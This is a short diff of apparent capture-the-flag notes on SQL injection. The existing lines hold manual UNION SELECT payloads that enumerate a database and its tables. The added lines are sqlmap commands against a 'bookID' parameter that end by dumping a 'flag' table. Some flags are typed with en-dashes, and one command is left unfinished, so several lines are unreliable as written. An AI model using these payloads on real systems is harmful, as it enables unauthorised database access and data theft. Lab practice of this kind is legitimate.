@@ -189,3 +189,12 @@ Four%' UNION ALL SELECT 1,2,3,4-- -
 Four%' UNION ALL SELECT 1,2,database(),4-- -
 Four%' UNION ALL SELECT 1,2,group_concat(table_name),4 from information_schema.tables-- -
 Four%' UNION ALL SELECT 1,2,group_concat(table_name),4 from information_schema.tables-- -
+======================================
+
+sqlmap -r req.txt –threads 10 -p "bookID" --schema --batch
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U --schema --batch
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U --dbs
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book --tables
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T flag --columns
+sqlmap -r req.txt –threads 10 -p "bookID" –technique U -D book -T flag --dump
